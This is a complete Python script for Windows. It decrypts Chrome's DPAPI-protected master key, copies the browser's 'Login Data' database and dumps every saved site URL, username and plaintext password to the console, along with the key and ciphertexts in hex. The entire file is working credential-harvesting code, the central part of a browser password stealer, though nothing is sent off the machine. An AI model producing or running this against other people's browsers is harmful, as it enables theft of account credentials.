import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime
import win32crypt
from Crypto.Cipher import AES

def get_chrome_master_key():
    """Retrieve and decrypt the AES master key from Chrome's 'Local State'."""
    local_state_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Local State')
    print(f"[INFO] Reading Local State from: {local_state_path}")

    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)

    encrypted_key_b64 = local_state['os_crypt']['encrypted_key']
    encrypted_key = base64.b64decode(encrypted_key_b64)
    # Remove DPAPI prefix "DPAPI" (5 bytes)
    encrypted_key = encrypted_key[5:]
    print(f"[DEBUG] Encrypted AES key (hex): {encrypted_key.hex()}")

    # Decrypt AES key using Windows DPAPI
    try:
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        print(f"[DEBUG] AES master key (hex): {master_key.hex()}")
        return master_key
    except Exception as e:
        print(f"[ERROR] Failed to decrypt AES master key: {e}")
        raise

def decrypt_password(ciphertext: bytes, master_key: bytes):
    """Decrypt Chrome password given ciphertext and master key."""
    print(f"[DEBUG] Encrypted blob (hex): {ciphertext.hex()}")

    if ciphertext.startswith(b'v10') or ciphertext.startswith(b'v20'):
        prefix = ciphertext[:3]
        print(f"[DEBUG] Prefix: {prefix.decode()} (AES-GCM encrypted)")
        try:
            # AES-GCM payload format:
            # prefix(3) + nonce(12) + ciphertext + tag(16)
            nonce = ciphertext[3:15]
            encrypted_pass = ciphertext[15:-16]
            tag = ciphertext[-16:]
            print(f"[DEBUG] Nonce (hex): {nonce.hex()}")
            print(f"[DEBUG] Encrypted data (hex): {encrypted_pass.hex()}")
            print(f"[DEBUG] Tag (hex): {tag.hex()}")

            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            decrypted_pass = cipher.decrypt_and_verify(encrypted_pass, tag)
            password = decrypted_pass.decode()
            print(f"[DEBUG] Decrypted password: {password}")
            return password
        except Exception as e:
            print(f"[ERROR] AES-GCM decryption failed: {e}")
            return "<decryption failed>"
    else:
        # Fallback to legacy Windows DPAPI decryption
        print(f"[DEBUG] Trying legacy DPAPI decryption.")
        try:
            decrypted_pass = win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1]
            if decrypted_pass:
                password = decrypted_pass.decode()
                print(f"[DEBUG] DPAPI decrypted password: {password}")
                return password
            else:
                print("[WARN] DPAPI returned empty password.")
                return "<empty password>"
        except Exception as e:
            print(f"[ERROR] DPAPI decryption failed: {e}")
            return "<decryption failed>"

def main():
    # Path to Chrome Login Data SQLite database
    login_data_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data')

    # Create a temporary copy to avoid locks
    tmp_db = "LoginDataTemp.db"
    shutil.copy2(login_data_path, tmp_db)

    master_key = get_chrome_master_key()

    conn = sqlite3.connect(tmp_db)
    cursor = conn.cursor()

    cursor.execute('SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins')

    for row in cursor.fetchall():
        origin_url, action_url, username, encrypted_password_blob, date_created, date_last_used = row

        print("="*60)
        print(f"Origin URL   : {origin_url}")
        print(f"Action URL   : {action_url}")
        print(f"Username     : {username}")

        if encrypted_password_blob:
            password = decrypt_password(encrypted_password_blob, master_key)
        else:
            password = "<empty blob>"

        print(f"Password     : {password}")
        print(f"Encrypted Hex: {encrypted_password_blob.hex() if encrypted_password_blob else ''}")

        # Chrome timestamps are microseconds since 1601-01-01 UTC
        def chrome_time_to_datetime(chrome_time):
            if chrome_time:
                return datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)
            return None

        # date_created and date_last_used may be None or 0
        try:
            created_dt = chrome_time_to_datetime(date_created)
        except Exception:
            created_dt = None

        try:
            last_used_dt = chrome_time_to_datetime(date_last_used)
        except Exception:
            last_used_dt = None

        print(f"Created      : {created_dt}")
        print(f"Last Used    : {last_used_dt}")

    cursor.close()
    conn.close()

    # Remove temp DB copy
    os.remove(tmp_db)

if __name__ == '__main__':
    from datetime import timedelta
    main()
